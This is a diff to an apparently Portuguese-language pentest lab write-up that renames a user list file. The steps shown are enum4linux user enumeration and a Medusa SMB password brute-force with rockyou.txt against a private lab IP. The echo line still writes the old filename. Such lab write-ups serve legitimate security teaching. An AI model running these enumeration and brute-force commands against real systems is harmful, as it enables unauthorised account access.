@@ -87,13 +87,13 @@ Etapa 1: Enumeração de usuários
 
 enum4linux -U 192.168.56.105
 
-* Foi criado o arquivo users.txt com os usuários reportados na enumeração: echo "msfadmin\nadmin\nuser" > users.txt
+* Foi criado o arquivo smb_users.txt com os usuários reportados na enumeração: echo "msfadmin\nadmin\nuser" > users.txt
 
 
 Etapa 2: Ataque SMB
 
 
-medusa -h 192.168.56.105 -U users.txt -P rockyou.txt -M smbnt
+medusa -h 192.168.56.105 -U smb_users.txt -P rockyou.txt -M smbnt
 
 
 Resultado:
